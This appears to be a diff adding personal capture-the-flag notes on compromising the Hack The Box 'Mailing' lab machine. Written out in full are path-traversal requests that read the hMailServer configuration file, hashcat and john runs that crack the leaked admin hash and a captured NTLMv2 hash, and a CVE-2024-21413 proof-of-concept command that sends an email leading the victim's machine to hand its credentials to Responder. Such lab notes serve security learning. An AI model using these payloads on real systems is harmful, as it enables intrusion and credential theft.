@@ -1,0 +1,391 @@
+25/tcp  open  smtp          hMailServer smtpd
+
+80/tcp  open  http          Microsoft IIS httpd 10.0
+
+110/tcp open  pop3          hMailServer pop3d     <---- seems interesting i dont know what this is
+
+135/tcp open  msrpc         Microsoft Windows RPC
+
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+
+143/tcp open  imap          hMailServer imapd
+
+445/tcp open  microsoft-ds?                       <---- SMB we could try getting pivot point here
+
+465/tcp open  ssl/smtp      hMailServer smtpd
+
+587/tcp open  smtp          hMailServer smtpd
+
+993/tcp open  ssl/imap      hMailServer imapd
+
+
+smbclient -L -N <ip>
+
+
+omg now the site loads okay. so im taken to http://mailing.htb/
+
+attempted file inclusing on the page
+
+http://mailing.htb/download.php?file=../../../../etc/hosts
+
+********* WAIT I NEED TO ADD A FILE THAT IS ON EVERY *WINDOWS* MACHINE NOT A LINUX MACHINE TwT *********
+
+http://mailing.htb/download.php?file=../../../../../../../../windows/system32/drivers/etc/hosts
+
+this worked and i got hosts
+
+used smb could do the thing like in the responder starting piont exercise
+
+
+got a fresh github copy of responder. starting smb server
+
+┌──(nix㉿kali)-[~/…/HTB/yoyo/mailing/Responder]
+└─$ sudo python3 Responder.py -I 10.10.16.74
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[!] Error: 10.10.16.74: Interface not found
+                                                                                    
+┌──(nix㉿kali)-[~/…/HTB/yoyo/mailing/Responder]
+└─$ sudo python3 Responder.py -I tun0       
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.74]
+    Responder IPv6             [dead:beef:4::1048]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-OOK1EF5NWS4]
+    Responder Domain Name      [55H5.LOCAL]
+    Responder DCE-RPC Port     [49312]
+
+[+] Listening for events...
+
+
+
+
+wait...
+
+
+
+10.10.11.14:445       - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{f0e6b38f-fd48-4441-94ed-8cae31ce87f3}) (authentication domain:MAILING)
+[*] 10.10.11.14:          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+
+theres a demo email used in the instructions called maya@mailing.htb
+
+maybe i could get control of that account?
+
+maybe the user flag is in the emails of maya?
+
+how do i get into their account though?
+
+
+
+AdministratorPassword - The main hMailServer administration password. The user for example needs to enter this password when starting hMailServer Administrator. This password is encoded using MD5.
+
+
+interesting...
+
+
+
+http://mailing.htb/download.php?file=../../../../../../../../../../../../..\Program%20Files\Windows%20NT\Accessories\wordpad.exe
+
+WAS ABLE TO DOWNLOAD THIS
+
+http://mailing.htb/download.php?file=../../../../../../../../../../../../..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.ini
+
+GOT THE HMAIL SERVER INI FILEKHGSRJHFLKKERSWHIKOERWKGH
+
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+
+
+okay from before, i know. okay im actually shaking im so happy. okay so the hash of the admin password is probably md5. im gonna try using hashcat.
+
+
+┌──(nix㉿kali)-[~/hacking_lab/HTB/yoyo/mailing]
+└─$ hashcat -m0 hmailadminhash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-penryn-13th Gen Intel(R) Core(TM) i7-13700F, 2910/5885 MB (1024 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.                                          
+If you want to switch to optimized kernels, append -O to your commandline.                                            
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing device kernels and memory. Please be patient..Initializing backend runtime for device #1. Please be patieHost memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
+Time.Started.....: Mon May  6 13:08:21 2024 (5 secs)
+Time.Estimated...: Mon May  6 13:08:26 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1656.2 kH/s (0.54ms) @ Accel:672 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 7564032/14344385 (52.73%)
+Rejected.........: 0/7564032 (0.00%)
+Restore.Point....: 7558656/14344385 (52.69%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: honden20 -> holz95
+Hardware.Mon.#1..: Util: 27%
+
+Started: Mon May  6 13:08:14 2024
+Stopped: Mon May  6 13:08:27 2024
+
+
+got it :) okay. so the password is homenetworkingadministrator
+
+can i log into the hmailserver now?
+
+username: Administrator@mailing.htb
+password: homenetworkingadministrator
+
+
+okay theres a cve in here
+
+WAIT I KNOW THE SMB VERSION FROM UHM THE SCAN THING IN METASPLOTI
+
+
+python3 CVE-2024-21413.py --server 10.10.11.14 --port 587 --username "Administrator@mailing.htb" --password "homenetworkingadministrator" --sender "Administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\192.168.6.128\test\meeting" --subject "CVE-2024-21413 PoC"
+
+
+┌──(nix㉿kali)-[~/hacking_lab/HTB/yoyo/mailing]
+└─$ sudo responder -I tun0       
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.74]
+    Responder IPv6             [dead:beef:4::1048]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-QTEG7TIT9CN]
+    Responder Domain Name      [YIDA.LOCAL]
+    Responder DCE-RPC Port     [48947]
+
+[+] Listening for events...                                
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.14
+[SMB] NTLMv2-SSP Username : MAILING\maya
+[SMB] NTLMv2-SSP Hash     : maya::MAILING:adb2d889e02a316a:28C12531A01D203319D72629158617FC:01010000000000008072B29EDB9FDA01DA29DCB79099C8110000000002000800590049004400410001001E00570049004E002D0051005400450047003700540049005400390043004E0004003400570049004E002D0051005400450047003700540049005400390043004E002E0059004900440041002E004C004F00430041004C000300140059004900440041002E004C004F00430041004C000500140059004900440041002E004C004F00430041004C00070008008072B29EDB9FDA0106000400020000000800300030000000000000000000000000200000A6BEFD7CB2E6B0F47C4F94E30BA0C9663659F446AE13A59B57CAB6D75076E3B80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370034000000000000000000                                               
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+
+
+
+LETS CRACK THIS SHITTTT
+
+
+└─$ john -w=/usr/share/wordlists/rockyou.txt mayahash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:00 DONE (2024-05-06 17:43) 1.030g/s 6118Kp/s 6118Kc/s 6118KC/s m61405..m3790k4162
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+
+maya's password: m4y4ngs4ri
+
+WAIT THIS ISNT MAYA
+
+thers another account
+
+mayabenito@mailing.htb
+
+i need to send a poc email to that mail account and then get the password of that
+
+
+
+
+
+
+
